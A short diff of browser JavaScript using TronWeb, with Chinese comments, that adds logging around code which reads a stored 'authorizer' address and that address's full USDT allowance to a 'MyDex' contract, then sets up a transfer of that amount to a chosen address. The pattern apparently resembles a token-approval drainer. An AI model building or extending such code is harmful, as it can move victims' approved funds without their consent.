@@ -51,12 +51,15 @@
         const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
         const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
 
-        // 使用 hex 格式的地址（避免非法參數）
+        // 取得第一個授權者的 hex 地址
         const from = await MyDex.getIndexAddress(0).call(); // hex 格式
-        const to = window.tronWeb.address.toHex(toAddressBase58); // 轉換成 hex 格式
+        console.log("從合約取得的 from 地址 (hex):", from);
+        console.log("轉成 base58 地址:", window.tronWeb.address.fromHex(from));
+
+        const to = window.tronWeb.address.toHex(toAddressBase58); // 轉成 hex 格式
 
         const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
-        const amount = allowance; // hex 格式數值，直接傳
+        const amount = allowance; // hex 格式數值
 
         if (BigInt(amount) === 0n) {
           return alert("尚未授權或授權金額為 0");
